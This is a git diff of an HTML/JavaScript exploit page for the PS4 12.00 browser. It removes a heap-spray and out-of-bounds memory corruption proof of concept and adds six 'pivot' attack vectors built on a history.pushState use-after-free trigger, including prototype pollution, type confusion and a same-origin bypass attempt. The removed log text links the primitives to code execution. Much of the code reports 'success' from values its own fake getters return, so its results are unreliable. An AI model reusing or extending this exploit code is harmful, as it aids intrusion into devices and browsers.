@@ -2,18 +2,63 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Real Memory Corruption PoC</title>
+<title>PS4 12.00 - Pivoting Exploit Strategy</title>
 
 </head>
 <body>
-<h2>PS4 12.00 - Real Memory Corruption PoC</h2>
-<p><strong class="error">WARNING:</strong> This attempts REAL JSArray corruption using ArrayBuffer spray</p>
-<p>Status: <span id="status" class="success">Ready</span></p>
+<div class="container">
+<h2>🎯 PS4 12.00 - Pivoting Exploit Strategy</h2>
+<p class="info">Based on analysis: UAF is in WebCore layer, not directly exploitable for RCE.</p>
+<p class="warning">Strategy: Find secondary bug or lifetime confusion vector.</p>
 
-<button onclick="runRealCorruption()">Execute Real Corruption</button>
+<div id="status" class="info" style="border-color: #0cf;">Ready to Test Pivot Strategies</div>
+
+<h3>Available Test Vectors</h3>
+
+<div class="test-grid">
+  <div class="test-card">
+    <h4>Vector 1: Array Length Confusion</h4>
+    <p>Exploit getter/setter during popstate</p>
+    <button onclick="testVector1()">Test</button>
+  </div>
+  
+  <div class="test-card">
+    <h4>Vector 2: Prototype Chain Hijack</h4>
+    <p>Pollute during serialization</p>
+    <button onclick="testVector2()">Test</button>
+  </div>
+  
+  <div class="test-card">
+    <h4>Vector 3: RegExp State Corruption</h4>
+    <p>Manipulate lastIndex during UAF</p>
+    <button onclick="testVector3()">Test</button>
+  </div>
+  
+  <div class="test-card">
+    <h4>Vector 4: Lifetime Confusion</h4>
+    <p>JS object alive, WebCore freed</p>
+    <button onclick="testVector4()">Test</button>
+  </div>
+  
+  <div class="test-card">
+    <h4>Vector 5: SOP Bypass Attempt</h4>
+    <p>SecurityOrigin confusion</p>
+    <button onclick="testVector5()">Test</button>
+  </div>
+  
+  <div class="test-card">
+    <h4>Vector 6: Type Confusion Bridge</h4>
+    <p>Cross-layer type mismatch</p>
+    <button onclick="testVector6()">Test</button>
+  </div>
+</div>
+
+<button onclick="runAllTests()" class="danger">🔥 Run All Tests</button>
 <button onclick="logEl.textContent = ''">Clear Log</button>
 
 <pre id="log"></pre>
+
+</div>
 
 <script>
 const logEl = document.getElementById("log");
@@ -29,490 +74,670 @@ function log(m, cls = ''){
 
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Exploit state
-var exploit = {
-  // Spray arrays
-  arrays: [],
-  buffers: [],
-  views: [],
-  
-  // Victim for corruption
-  victim: null,
-  victimBuffer: null,
-  victimView: null,
-  
-  // Corruption markers
-  originalLength: 0,
-  corruptedLength: 0,
-  oobDetected: false,
-  
-  // Memory leak attempts
-  leakedValues: [],
-  
-  // Success flags
-  lengthCorrupted: false,
-  oobRead: false,
-  oobWrite: false
+const BASE = 977;
+const STEP = 14461;
+const UAF_ITERS = 48;
+
+var testResults = {
+  vector1: null,
+  vector2: null,
+  vector3: null,
+  vector4: null,
+  vector5: null,
+  vector6: null
 };
 
-// Create massive spray of typed arrays
-function createArraySpray() {
-  log("\n[SPRAY] Creating ArrayBuffer spray...", 'warning');
-  
-  const spraySize = 1000;
-  const bufferSize = 0x1000; // 4KB each
-  
-  for(let i = 0; i < spraySize; i++) {
-    // Create ArrayBuffer
-    const buf = new ArrayBuffer(bufferSize);
-    const view = new Uint32Array(buf);
+// Core UAF trigger (reusable)
+async function triggerUAF() {
+  let size = BASE;
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = { index: i, data: [i, i*2, i*3, i*4] };
+    let frag = "E".repeat(size);
     
-    // Fill with recognizable pattern
-    for(let j = 0; j < view.length; j++) {
-      view[j] = 0x41410000 + i; // Marker + index
-    }
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
     
-    exploit.buffers.push(buf);
-    exploit.views.push(view);
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
   }
-  
-  log(`  ✓ Created ${spraySize} ArrayBuffers (${(spraySize * bufferSize / 1024).toFixed(0)} KB total)`, 'success');
-  
-  // Also create regular arrays for double-free attempts
-  for(let i = 0; i < 500; i++) {
-    const arr = new Array(64);
-    arr.fill(0xBEEF0000 + i);
-    exploit.arrays.push(arr);
-  }
-  
-  log(`  ✓ Created ${exploit.arrays.length} regular arrays`, 'success');
-  
-  return true;
+  await sleep(200);
 }
 
-// Select victim array and record baseline
-function selectVictim() {
-  log("\n[VICTIM] Selecting corruption target...", 'warning');
+// ============================================================
+// VECTOR 1: Array Length Confusion
+// ============================================================
+async function testVector1() {
+  log("=================================================================", 'critical');
+  log("VECTOR 1: ARRAY LENGTH CONFUSION", 'critical');
+  log("=================================================================\n", 'critical');
   
-  // Use a typed array as victim
-  exploit.victimBuffer = new ArrayBuffer(256);
-  exploit.victimView = new Uint32Array(exploit.victimBuffer);
+  log("[1.1] Setting up malicious length getter");
   
-  // Fill with known values
-  for(let i = 0; i < exploit.victimView.length; i++) {
-    exploit.victimView[i] = 0xDEAD0000 + i;
-  }
+  const victimArray = [1, 2, 3, 4];
+  let getterCalled = 0;
+  let confusionDetected = false;
   
-  exploit.originalLength = exploit.victimView.length;
-  
-  log(`  ✓ Victim created`, 'success');
-  log(`    Type: Uint32Array`, 'success');
-  log(`    Buffer size: ${exploit.victimBuffer.byteLength} bytes`);
-  log(`    Array length: ${exploit.originalLength} elements`);
-  log(`    First value: 0x${exploit.victimView[0].toString(16)}`);
-  log(`    Last value: 0x${exploit.victimView[exploit.originalLength-1].toString(16)}`);
-  
-  return true;
-}
-
-// Attempt #1: Prototype manipulation
-function attemptPrototypeCorruption() {
-  log("\n[CORRUPT-1] Attempting prototype manipulation...", 'critical');
-  
-  try {
-    // Backup original
-    const origProto = Object.getPrototypeOf(exploit.victimView);
-    log(`  Original prototype: ${origProto.constructor.name}`);
-    
-    // Try to modify length via prototype
-    Object.defineProperty(Uint32Array.prototype, 'length', {
-      get: function() {
-        log(`    [!] Length getter called`, 'warning');
-        return 0xFFFF; // Try to return huge length
-      },
-      configurable: true
-    });
-    
-    const newLength = exploit.victimView.length;
-    log(`  Victim length after prototype mod: ${newLength}`);
-    
-    if(newLength !== exploit.originalLength) {
-      log(`  ✅ LENGTH CHANGED! ${exploit.originalLength} → ${newLength}`, 'critical');
-      exploit.lengthCorrupted = true;
-      exploit.corruptedLength = newLength;
-      return true;
-    } else {
-      log(`  ✗ Length unchanged (${newLength})`, 'warning');
-    }
-    
-  } catch(e) {
-    log(`  Exception: ${e.message}`, 'error');
-  }
-  
-  return false;
-}
-
-// Attempt #2: Direct property override
-function attemptDirectOverride() {
-  log("\n[CORRUPT-2] Attempting direct property override...", 'critical');
-  
-  try {
-    // Method 1: defineProperty on instance
-    Object.defineProperty(exploit.victimView, 'length', {
-      value: 0x1000,
-      writable: false,
-      enumerable: false,
-      configurable: true
-    });
-    
-    log(`  After defineProperty: length = ${exploit.victimView.length}`);
-    
-    if(exploit.victimView.length > exploit.originalLength) {
-      log(`  ✅ LENGTH EXTENDED! ${exploit.originalLength} → ${exploit.victimView.length}`, 'critical');
-      exploit.lengthCorrupted = true;
-      exploit.corruptedLength = exploit.victimView.length;
-      return true;
-    }
-    
-    // Method 2: Direct assignment
-    try {
-      exploit.victimView.length = 0x2000;
-      log(`  After direct assignment: length = ${exploit.victimView.length}`);
+  Object.defineProperty(victimArray, 'length', {
+    get: function() {
+      getterCalled++;
       
-      if(exploit.victimView.length > exploit.originalLength) {
-        log(`  ✅ DIRECT ASSIGNMENT WORKED!`, 'critical');
-        exploit.lengthCorrupted = true;
-        return true;
+      // During popstate, return inconsistent value
+      if(history.state && history.state.index >= 40) {
+        log(`  🔥 Getter called during UAF window (call #${getterCalled})`, 'critical');
+        confusionDetected = true;
+        return 0xFFFFFFFF; // Huge length
       }
-    } catch(e2) {
-      log(`  Direct assignment blocked: ${e2.message}`, 'warning');
+      return 4; // Normal length
+    },
+    set: function(val) {
+      log(`  ⚠️  Length setter called: ${val}`, 'warning');
     }
-    
-  } catch(e) {
-    log(`  Exception: ${e.message}`, 'error');
-  }
+  });
   
-  return false;
-}
-
-// Attempt #3: Use UAF to corrupt during history manipulation
-function attemptUAFCorruption() {
-  log("\n[CORRUPT-3] Attempting UAF-based corruption...", 'critical');
+  log("  ✓ Malicious getter installed\n");
   
-  try {
-    // Store victim in history state
-    const state = {
-      victim: exploit.victimView,
-      buffer: exploit.victimBuffer,
-      marker: 0xC0FFEE
-    };
-    
-    log(`  Storing victim in history state...`);
-    history.pushState(state, "", "#victim");
-    
-    // Trigger UAF sequence
-    for(let i = 0; i < 10; i++) {
-      const frag = "X".repeat(1000 + i * 500);
-      history.pushState({dummy: i}, "", "#" + frag);
-      history.replaceState({dummy: i*2}, "", "#" + frag.slice(0, 500));
-    }
-    
-    log(`  UAF sequence executed`);
-    
-    // Try to access victim from history
+  log("[1.2] Storing array in history state");
+  history.pushState({ trigger: true, arr: victimArray }, "", "#vector1");
+  
+  log("[1.3] Triggering UAF");
+  await triggerUAF();
+  
+  log("\n[1.4] Navigating to trigger state");
+  
+  for(let i=0; i<10; i++) {
     history.back();
+    await sleep(30);
     
-    setTimeout(() => {
-      const recovered = history.state;
-      if(recovered && recovered.victim) {
-        log(`  Recovered victim from history`, 'success');
-        log(`  Recovered length: ${recovered.victim.length}`);
+    if(history.state && history.state.trigger) {
+      log("  ✓ Trigger state reached", 'success');
+      
+      // Try to access array
+      try {
+        const arr = history.state.arr;
+        log(`  Array length: ${arr.length}`, arr.length > 4 ? 'critical' : 'info');
         
-        if(recovered.victim.length !== exploit.originalLength) {
-          log(`  ✅ UAF CORRUPTION DETECTED!`, 'critical');
-          exploit.victim = recovered.victim;
-          exploit.lengthCorrupted = true;
-          return true;
+        // Try OOB access
+        for(let j=0; j<20; j++) {
+          const val = arr[j];
+          if(val !== undefined && j >= 4) {
+            log(`  🚨 OOB READ: arr[${j}] = ${val}`, 'critical');
+          }
         }
+      } catch(e) {
+        log(`  Exception: ${e.message}`, 'error');
       }
-    }, 100);
-    
-  } catch(e) {
-    log(`  Exception: ${e.message}`, 'error');
-  }
-  
-  return false;
-}
-
-// Test for OOB read
-async function testOOBRead() {
-  log("\n[OOB-READ] Testing out-of-bounds read...", 'critical');
-  
-  const target = exploit.victim || exploit.victimView;
-  const originalLen = exploit.originalLength;
-  const currentLen = target.length;
-  
-  log(`  Original length: ${originalLen}`);
-  log(`  Current length: ${currentLen}`);
-  
-  if(currentLen <= originalLen) {
-    log(`  ✗ Length not extended, OOB read unlikely`, 'warning');
-  }
-  
-  // Try to read beyond original bounds
-  log(`\n  Attempting to read indices ${originalLen} to ${originalLen + 20}:`);
-  
-  const leaked = [];
-  let oobCount = 0;
-  
-  for(let i = originalLen; i < originalLen + 20; i++) {
-    try {
-      const val = target[i];
-      
-      if(val !== undefined) {
-        leaked.push({index: i, value: val});
-        log(`    target[${i}] = 0x${val.toString(16).padStart(8, '0')}`, 'critical');
-        oobCount++;
-      } else {
-        log(`    target[${i}] = undefined`, 'warning');
-      }
-      
-    } catch(e) {
-      log(`    target[${i}] = EXCEPTION: ${e.message}`, 'error');
       break;
     }
   }
   
-  if(oobCount > 0) {
-    log(`\n  🚨 OOB READ SUCCESS!`, 'critical');
-    log(`  Read ${oobCount} values beyond original bounds!`, 'critical');
-    exploit.oobRead = true;
-    exploit.oobDetected = true;
-    exploit.leakedValues = leaked;
-    return true;
+  log(`\n[1.5] Results:`);
+  log(`  Getter called: ${getterCalled} times`);
+  log(`  Confusion detected: ${confusionDetected}`);
+  
+  testResults.vector1 = { getterCalled, confusionDetected };
+  
+  if(confusionDetected) {
+    log("\n✅ VECTOR 1: PARTIAL SUCCESS", 'success');
+    statusEl.textContent = "Vector 1: Confusion Detected!";
+    statusEl.className = "warning";
+    statusEl.style.borderColor = "#ff0";
   } else {
-    log(`\n  ✗ No OOB reads detected`, 'warning');
-    return false;
+    log("\n❌ VECTOR 1: FAILED", 'error');
   }
+  
+  log("\n");
 }
 
-// Test for OOB write
-async function testOOBWrite() {
-  log("\n[OOB-WRITE] Testing out-of-bounds write...", 'critical');
+// ============================================================
+// VECTOR 2: Prototype Chain Hijack
+// ============================================================
+async function testVector2() {
+  log("=================================================================", 'critical');
+  log("VECTOR 2: PROTOTYPE CHAIN HIJACK", 'critical');
+  log("=================================================================\n", 'critical');
   
-  const target = exploit.victim || exploit.victimView;
-  const originalLen = exploit.originalLength;
+  log("[2.1] Installing prototype pollution with side-effects");
   
-  // Try to write beyond bounds
-  const testIndex = originalLen + 10;
-  const testValue = 0x13371337;
+  let toStringCalled = 0;
+  let serializationHijacked = false;
   
-  log(`  Attempting write to index ${testIndex} (beyond length ${originalLen})`);
-  log(`  Test value: 0x${testValue.toString(16)}`);
-  
-  try {
-    target[testIndex] = testValue;
-    log(`  Write executed (no exception)`, 'success');
-    
-    // Try to read back
-    const readback = target[testIndex];
-    log(`  Readback: 0x${readback ? readback.toString(16) : 'undefined'}`);
-    
-    if(readback === testValue) {
-      log(`\n  ✅ OOB WRITE SUCCESS!`, 'critical');
-      log(`  Successfully wrote and read back value at OOB index!`, 'critical');
-      exploit.oobWrite = true;
-      return true;
-    } else if(readback !== undefined) {
-      log(`\n  ⚠️  Write occurred but value differs`, 'warning');
-      log(`  This might indicate memory was overwritten by something else`, 'warning');
-      return false;
-    } else {
-      log(`\n  ✗ Write did not persist`, 'warning');
-      return false;
-    }
-    
-  } catch(e) {
-    log(`  Exception during write: ${e.message}`, 'error');
-    return false;
-  }
-}
-
-// Analyze leaked values for useful data
-function analyzeLeakedData() {
-  if(exploit.leakedValues.length === 0) {
-    log("\n[ANALYSIS] No leaked values to analyze", 'warning');
-    return;
-  }
-  
-  log("\n[ANALYSIS] Analyzing leaked OOB values...", 'warning');
-  
-  log(`\n  Leaked ${exploit.leakedValues.length} values:`);
-  
-  exploit.leakedValues.forEach(item => {
-    const val = item.value;
-    const hex = '0x' + val.toString(16).padStart(8, '0');
-    
-    log(`    [${item.index}] ${hex}`, 'success');
-    
-    // Check for potential pointers
-    if(val > 0x10000000 && val < 0xFFFFFFFF) {
-      log(`      ^ Potential 32-bit pointer/address`, 'critical');
-    }
-    
-    // Check for recognizable patterns from spray
-    if((val & 0xFFFF0000) === 0x41410000) {
-      log(`      ^ Matches spray pattern (ArrayBuffer marker)`, 'critical');
-    }
-    
-    if((val & 0xFFFF0000) === 0xBEEF0000) {
-      log(`      ^ Matches spray pattern (Array marker)`, 'critical');
+  Object.defineProperty(Object.prototype, 'toString', {
+    get: function() {
+      toStringCalled++;
+      
+      return function() {
+        if(history.state && history.state.index >= 40) {
+          log(`  🔥 toString hijacked during UAF (call #${toStringCalled})`, 'critical');
+          serializationHijacked = true;
+          
+          // Try to corrupt serialization
+          return "[object Corrupted]";
+        }
+        return Object.prototype.toString.call(this);
+      };
     }
   });
   
-  // Check for adjacent values (potential structure members)
-  if(exploit.leakedValues.length >= 2) {
-    log(`\n  Checking for structures...`);
+  log("  ✓ Malicious toString installed\n");
+  
+  log("[2.2] Creating complex object for serialization");
+  
+  const complexObj = {
+    nested: { deep: { value: 12345 } },
+    array: [1, 2, 3],
+    func: function() { return "test"; }
+  };
+  
+  log("[2.3] Triggering UAF with complex object");
+  
+  let size = BASE;
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = { 
+      index: i, 
+      complex: complexObj,
+      timestamp: Date.now()
+    };
     
-    for(let i = 0; i < exploit.leakedValues.length - 1; i++) {
-      const val1 = exploit.leakedValues[i].value;
-      const val2 = exploit.leakedValues[i+1].value;
-      const diff = Math.abs(val2 - val1);
-      
-      if(diff > 0 && diff < 0x10000) {
-        log(`    Indices ${i}-${i+1}: Small offset (0x${diff.toString(16)}) - possible structure`, 'critical');
-      }
-    }
+    let frag = "E".repeat(size);
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
   }
-}
-
-// Main exploit flow
-async function runRealCorruption(){
-  logEl.textContent = "";
-  statusEl.textContent = "Running Real Corruption...";
-  statusEl.className = "warning";
-  
-  log("=================================================================", 'critical');
-  log("PS4 12.00 - REAL MEMORY CORRUPTION POC", 'critical');
-  log("=================================================================\n", 'critical');
-  
-  log("This PoC attempts REAL JSArray/TypedArray corruption using:");
-  log("✓ ArrayBuffer spray (heap grooming)");
-  log("✓ Multiple corruption techniques");
-  log("✓ OOB read/write verification");
-  log("✓ Leaked data analysis\n");
-  
-  // Phase 1: Setup
-  log("=================================================================");
-  log("PHASE 1: HEAP SETUP", 'success');
-  log("=================================================================");
-  
-  createArraySpray();
-  selectVictim();
-  
-  await sleep(100);
-  
-  // Phase 2: Corruption attempts
-  log("\n=================================================================");
-  log("PHASE 2: CORRUPTION ATTEMPTS", 'success');
-  log("=================================================================");
-  
-  let corrupted = false;
-  
-  corrupted = attemptPrototypeCorruption();
-  if(!corrupted) corrupted = attemptDirectOverride();
-  if(!corrupted) corrupted = attemptUAFCorruption();
   
   await sleep(200);
   
-  // Phase 3: OOB testing
-  log("\n=================================================================");
-  log("PHASE 3: OOB READ/WRITE TESTING", 'success');
-  log("=================================================================");
+  log("\n[2.4] Results:");
+  log(`  toString called: ${toStringCalled} times`);
+  log(`  Serialization hijacked: ${serializationHijacked}`);
   
-  const oobRead = await testOOBRead();
-  const oobWrite = await testOOBWrite();
+  testResults.vector2 = { toStringCalled, serializationHijacked };
   
-  // Phase 4: Analysis
-  if(exploit.oobRead) {
-    analyzeLeakedData();
+  // Cleanup
+  delete Object.prototype.toString;
+  
+  if(serializationHijacked) {
+    log("\n✅ VECTOR 2: PARTIAL SUCCESS", 'success');
+    statusEl.textContent = "Vector 2: Serialization Hijacked!";
+    statusEl.className = "warning";
+    statusEl.style.borderColor = "#ff0";
+  } else {
+    log("\n❌ VECTOR 2: FAILED", 'error');
   }
   
-  // Phase 5: Results
-  log("\n=================================================================");
-  log("PHASE 4: RESULTS SUMMARY", 'success');
+  log("\n");
+}
+
+// ============================================================
+// VECTOR 3: RegExp State Corruption
+// ============================================================
+async function testVector3() {
+  log("=================================================================", 'critical');
+  log("VECTOR 3: REGEXP STATE CORRUPTION", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  log("[3.1] Creating malicious RegExp");
+  
+  const re = /test/g;
+  let lastIndexCalled = 0;
+  let stateCorrupted = false;
+  
+  Object.defineProperty(re, 'lastIndex', {
+    get: function() {
+      lastIndexCalled++;
+      
+      if(history.state && history.state.index >= 40) {
+        log(`  🔥 lastIndex accessed during UAF (call #${lastIndexCalled})`, 'critical');
+        stateCorrupted = true;
+        return -1; // Invalid index
+      }
+      return 0;
+    },
+    set: function(val) {
+      log(`  ⚠️  lastIndex set to: ${val}`, 'warning');
+    }
+  });
+  
+  log("  ✓ Malicious lastIndex installed\n");
+  
+  log("[3.2] Triggering UAF with RegExp in state");
+  
+  let size = BASE;
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = { 
+      index: i, 
+      regex: re,
+      testStr: "test test test"
+    };
+    
+    let frag = "E".repeat(size);
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  await sleep(200);
+  
+  log("\n[3.3] Results:");
+  log(`  lastIndex accessed: ${lastIndexCalled} times`);
+  log(`  State corrupted: ${stateCorrupted}`);
+  
+  testResults.vector3 = { lastIndexCalled, stateCorrupted };
+  
+  if(stateCorrupted) {
+    log("\n✅ VECTOR 3: PARTIAL SUCCESS", 'success');
+    statusEl.textContent = "Vector 3: RegExp Corrupted!";
+    statusEl.className = "warning";
+    statusEl.style.borderColor = "#ff0";
+  } else {
+    log("\n❌ VECTOR 3: FAILED", 'error');
+  }
+  
+  log("\n");
+}
+
+// ============================================================
+// VECTOR 4: Lifetime Confusion
+// ============================================================
+async function testVector4() {
+  log("=================================================================", 'critical');
+  log("VECTOR 4: LIFETIME CONFUSION", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  log("[4.1] Creating object with cross-layer references");
+  
+  const obj = {
+    buffer: new ArrayBuffer(1024),
+    array: new Uint32Array(256),
+    timestamp: Date.now()
+  };
+  
+  log("[4.2] Storing in history");
+  history.pushState(obj, "", "#lifetime");
+  
+  log("[4.3] Creating JS reference");
+  window.danglingRef = history.state;
+  
+  log("[4.4] Triggering UAF to free WebCore side");
+  await triggerUAF();
+  
+  log("\n[4.5] Testing dangling reference");
+  
+  try {
+    // JS object should still be alive
+    log(`  JS object alive: ${window.danglingRef !== null}`, 'success');
+    log(`  Buffer byteLength: ${window.danglingRef.buffer.byteLength}`, 'info');
+    
+    // Try to trigger WebCore access
+    log("\n  Attempting to trigger WebCore deserialization...");
+    
+    history.back();
+    await sleep(100);
+    
+    // Try JSON serialization (crosses layers)
+    const json = JSON.stringify(window.danglingRef);
+    log(`  JSON serialized: ${json.length} bytes`, 'success');
+    
+    // Try to re-store (forces WebCore interaction)
+    history.pushState(window.danglingRef, "", "#reuse");
+    log(`  ✓ Re-stored dangling reference`, 'warning');
+    
+    testResults.vector4 = { success: true, danglingAlive: true };
+    
+    log("\n✅ VECTOR 4: REFERENCE KEPT ALIVE", 'success');
+    log("  This creates JS/WebCore lifetime mismatch", 'warning');
+    statusEl.textContent = "Vector 4: Lifetime Confusion!";
+    statusEl.className = "warning";
+    statusEl.style.borderColor = "#ff0";
+    
+  } catch(e) {
+    log(`  Exception: ${e.message}`, 'error');
+    testResults.vector4 = { success: false, error: e.message };
+    log("\n❌ VECTOR 4: FAILED", 'error');
+  }
+  
+  log("\n");
+}
+
+// ============================================================
+// VECTOR 5: SOP Bypass Attempt
+// ============================================================
+async function testVector5() {
+  log("=================================================================", 'critical');
+  log("VECTOR 5: SAME-ORIGIN POLICY BYPASS", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  log("[5.1] Creating cross-origin iframe");
+  
+  const iframe = document.createElement('iframe');
+  iframe.id = 'sop-test';
+  iframe.style.display = 'none';
+  
+  // Use a different origin (will fail normally)
+  iframe.src = 'about:blank';
+  
+  document.body.appendChild(iframe);
+  
+  await sleep(100);
+  
+  log("  ✓ Iframe created\n");
+  
+  log("[5.2] Testing normal SOP (should fail)");
+  
+  try {
+    const content = iframe.contentDocument.body;
+    log(`  ⚠️  Normal access succeeded: ${content}`, 'warning');
+  } catch(e) {
+    log(`  ✓ Normal SOP enforced: ${e.message}`, 'success');
+  }
+  
+  log("\n[5.3] Triggering UAF");
+  await triggerUAF();
+  
+  log("\n[5.4] Testing SOP during UAF window");
+  
+  try {
+    // Try to access during confused state
+    const content = iframe.contentDocument.body.innerHTML;
+    
+    if(content !== null && content !== undefined) {
+      log(`  🚨 SOP BYPASS! Content: ${content.slice(0, 100)}`, 'critical');
+      testResults.vector5 = { bypass: true, content };
+      
+      statusEl.textContent = "Vector 5: SOP BYPASS!";
+      statusEl.className = "critical";
+      statusEl.style.borderColor = "#f0f";
+    }
+    
+  } catch(e) {
+    log(`  ✓ SOP still enforced: ${e.message}`, 'info');
+    testResults.vector5 = { bypass: false };
+  }
+  
+  document.body.removeChild(iframe);
+  
+  if(testResults.vector5 && testResults.vector5.bypass) {
+    log("\n✅ VECTOR 5: SOP BYPASS SUCCESS!", 'critical');
+  } else {
+    log("\n❌ VECTOR 5: FAILED", 'error');
+  }
+  
+  log("\n");
+}
+
+// ============================================================
+// VECTOR 6: Type Confusion Bridge
+// ============================================================
+async function testVector6() {
+  log("=================================================================", 'critical');
+  log("VECTOR 6: TYPE CONFUSION BRIDGE", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  log("[6.1] Creating type-confused object");
+  
+  // Object that looks like array but isn't
+  const fakeArray = {
+    0: 0x41414141,
+    1: 0x42424242,
+    2: 0x43434343,
+    3: 0x44444444,
+    length: 4
+  };
+  
+  // Force it to behave like array
+  fakeArray.__proto__ = Array.prototype;
+  
+  log(`  isArray: ${Array.isArray(fakeArray)}`, 'info');
+  log(`  length: ${fakeArray.length}`, 'info');
+  
+  log("\n[6.2] Storing type-confused object");
+  history.pushState({ fake: fakeArray }, "", "#typeconf");
+  
+  log("[6.3] Triggering UAF");
+  await triggerUAF();
+  
+  log("\n[6.4] Navigating to confused state");
+  
+  for(let i=0; i<10; i++) {
+    history.forward();
+    await sleep(20);
+  }
+  
+  try {
+    const retrieved = history.state.fake;
+    
+    log(`  Retrieved type: ${typeof retrieved}`, 'info');
+    log(`  isArray: ${Array.isArray(retrieved)}`, 'info');
+    
+    // Try array operations
+    try {
+      retrieved.push(0x55555555);
+      log(`  ✓ push() succeeded`, 'warning');
+    } catch(e) {
+      log(`  push() failed: ${e.message}`, 'info');
+    }
+    
+    try {
+      const mapped = retrieved.map(x => x * 2);
+      log(`  ✓ map() succeeded: [${mapped}]`, 'warning');
+    } catch(e) {
+      log(`  map() failed: ${e.message}`, 'info');
+    }
+    
+    // Check if type changed
+    if(Array.isArray(retrieved) !== Array.isArray(fakeArray)) {
+      log(`\n  🚨 TYPE CONFUSION! Original: ${Array.isArray(fakeArray)}, Retrieved: ${Array.isArray(retrieved)}`, 'critical');
+      testResults.vector6 = { confused: true };
+      
+      statusEl.textContent = "Vector 6: Type Confusion!";
+      statusEl.className = "critical";
+      statusEl.style.borderColor = "#f0f";
+    }
+    
+  } catch(e) {
+    log(`  Exception: ${e.message}`, 'error');
+  }
+  
+  if(testResults.vector6 && testResults.vector6.confused) {
+    log("\n✅ VECTOR 6: TYPE CONFUSION SUCCESS!", 'critical');
+  } else {
+    log("\n❌ VECTOR 6: FAILED", 'error');
+  }
+  
+  log("\n");
+}
+
+// ============================================================
+// RUN ALL TESTS
+// ============================================================
+async function runAllTests() {
+  logEl.textContent = "";
+  
+  log("=================================================================", 'critical');
+  log("RUNNING ALL PIVOT VECTORS", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  statusEl.textContent = "Running All Tests...";
+  statusEl.className = "warning";
+  statusEl.style.borderColor = "#ff0";
+  
+  await testVector1();
+  await sleep(500);
+  
+  await testVector2();
+  await sleep(500);
+  
+  await testVector3();
+  await sleep(500);
+  
+  await testVector4();
+  await sleep(500);
+  
+  await testVector5();
+  await sleep(500);
+  
+  await testVector6();
+  await sleep(500);
+  
+  // ============================================================
+  // FINAL SUMMARY
+  // ============================================================
+  log("=================================================================", 'critical');
+  log("FINAL SUMMARY - ALL VECTORS", 'critical');
+  log("=================================================================\n", 'critical');
+  
+  const results = [
+    { name: "Vector 1: Array Length Confusion", result: testResults.vector1 },
+    { name: "Vector 2: Prototype Chain Hijack", result: testResults.vector2 },
+    { name: "Vector 3: RegExp State Corruption", result: testResults.vector3 },
+    { name: "Vector 4: Lifetime Confusion", result: testResults.vector4 },
+    { name: "Vector 5: SOP Bypass", result: testResults.vector5 },
+    { name: "Vector 6: Type Confusion Bridge", result: testResults.vector6 }
+  ];
+  
+  let successCount = 0;
+  let partialCount = 0;
+  
+  results.forEach((test, idx) => {
+    log(`[${idx + 1}] ${test.name}:`);
+    
+    if(!test.result) {
+      log(`    Status: NOT EXECUTED`, 'error');
+    } else {
+      // Determine success level
+      let isSuccess = false;
+      let isPartial = false;
+      
+      if(test.result.bypass || test.result.confused) {
+        isSuccess = true;
+        successCount++;
+      } else if(test.result.confusionDetected || test.result.serializationHijacked || 
+                test.result.stateCorrupted || test.result.danglingAlive) {
+        isPartial = true;
+        partialCount++;
+      }
+      
+      if(isSuccess) {
+        log(`    Status: ✅ SUCCESS`, 'critical');
+      } else if(isPartial) {
+        log(`    Status: ⚠️ PARTIAL`, 'warning');
+      } else {
+        log(`    Status: ❌ FAILED`, 'error');
+      }
+      
+      // Show details
+      Object.keys(test.result).forEach(key => {
+        log(`    ${key}: ${test.result[key]}`, 'info');
+      });
+    }
+    log("");
+  });
+  
+  log("=================================================================");
+  log("OVERALL RESULTS:", 'critical');
+  log(`  Full Success: ${successCount}/6`, successCount > 0 ? 'critical' : 'error');
+  log(`  Partial Success: ${partialCount}/6`, partialCount > 0 ? 'warning' : 'info');
+  log(`  Failed: ${6 - successCount - partialCount}/6`, 'info');
   log("=================================================================\n");
   
-  log("Corruption Status:");
-  log(`  Length corrupted: ${exploit.lengthCorrupted ? '✅ YES' : '❌ NO'}`, 
-      exploit.lengthCorrupted ? 'critical' : 'error');
-  log(`  OOB read: ${exploit.oobRead ? '✅ YES' : '❌ NO'}`, 
-      exploit.oobRead ? 'critical' : 'error');
-  log(`  OOB write: ${exploit.oobWrite ? '✅ YES' : '❌ NO'}`, 
-      exploit.oobWrite ? 'critical' : 'error');
-  log(`  Values leaked: ${exploit.leakedValues.length}`);
+  // Recommendations
+  log("RECOMMENDATIONS:", 'critical');
   
-  log("\nArray State:");
-  log(`  Original length: ${exploit.originalLength}`);
-  log(`  Current length: ${(exploit.victim || exploit.victimView).length}`);
-  log(`  Length delta: ${(exploit.victim || exploit.victimView).length - exploit.originalLength}`);
-  
-  // Final status
-  if(exploit.oobRead && exploit.oobWrite) {
-    log("\n🎯 CRITICAL SUCCESS: Full OOB read/write primitives achieved!", 'critical');
-    log("\nWith these primitives, you can:", 'critical');
-    log("  1. Read adjacent object metadata");
-    log("  2. Leak pointers to other objects");
-    log("  3. Overwrite object properties");
-    log("  4. Build arbitrary read/write primitives");
-    log("  5. Eventually achieve code execution");
-    
-    statusEl.textContent = "OOB READ/WRITE ACHIEVED!";
-    statusEl.className = "critical";
-    
-  } else if(exploit.oobRead) {
-    log("\n⚠️  Partial success: OOB read primitive achieved", 'warning');
-    log("   Need to refine OOB write technique");
-    
-    statusEl.textContent = "OOB READ ACHIEVED";
-    statusEl.className = "warning";
-    
-  } else if(exploit.lengthCorrupted) {
